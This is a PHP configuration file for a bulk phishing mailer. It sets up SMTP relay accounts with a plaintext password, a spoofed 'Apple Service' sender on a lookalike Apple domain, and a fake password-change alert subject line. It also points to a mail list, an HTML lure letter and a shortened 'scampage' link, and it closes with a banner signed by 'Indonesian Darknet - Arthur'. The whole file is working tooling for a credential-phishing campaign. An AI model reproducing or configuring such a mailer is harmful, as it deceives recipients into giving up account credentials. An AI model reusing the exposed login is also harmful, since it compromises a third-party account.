<?php

//Regards
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "admin@info-apple.org",
        "password" => "Admur04012000"
    ],
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "admin@info-apple.org",
        "password" => "Admur04012000"
    ],
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "admin@info-apple.org",
        "password" => "Admur04012000"
    ],

];

/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 3,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/hot.txt",
    "fromname"       => "Apple Service",
    "frommail"       => "noreply@setting-updates-services.apple-supporte-account-services.com",
    "subject"        => "Re: [Alert] [New Statement] Confirmation change password of Apple Account In Google Safari ( Saturday, 23 June, 2018 ).",
    "msgfile"        => "file/letter/wk.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["http://ow.ly/rHwy30kDaeP"],
];
// INDONESIAN _ DARKNET - ARTHUR

/*

 █████╗ ██████╗ ████████╗██╗  ██╗██╗   ██╗██████╗
██╔══██╗██╔══██╗╚══██╔══╝██║  ██║██║   ██║██╔══██╗
███████║██████╔╝   ██║   ███████║██║   ██║██████╔╝
██╔══██║██╔══██╗   ██║   ██╔══██║██║   ██║██╔══██╗
██║  ██║██║  ██║   ██║   ██║  ██║╚██████╔╝██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
     Come From The deepest darkest
                        Mind With Truly Deepest darkest Secret.
*/